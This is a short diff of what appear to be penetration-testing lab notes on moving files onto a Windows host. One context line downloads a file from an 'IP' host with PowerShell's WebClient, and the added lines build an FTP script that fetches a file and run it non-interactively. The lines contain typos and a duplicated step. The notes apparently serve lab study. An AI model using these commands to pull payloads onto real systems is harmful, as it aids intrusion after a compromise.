@@ -33,4 +33,13 @@
     # win7 and later win, powershell download file
         powershell.sex (New-ObjectSystem.Net.WebClient).DownloadFile('http://IP/xxx','newname.xx')
  
- 
+     # non-interactive situation
+        echo open IP > ftp.txt
+        echo USER offsec >> ftp.txt
+        echo lab >> ftp.txt
+        echo bin >> ftp.txt
+        echo bin >> ftp.txt
+        echo GET xx(file name) >> ftp.txt
+        echo bye >> ftp.txt
+        # then on the source host,,  
+            ftp -v -n -s:ftp.txt  #-s set the file to run
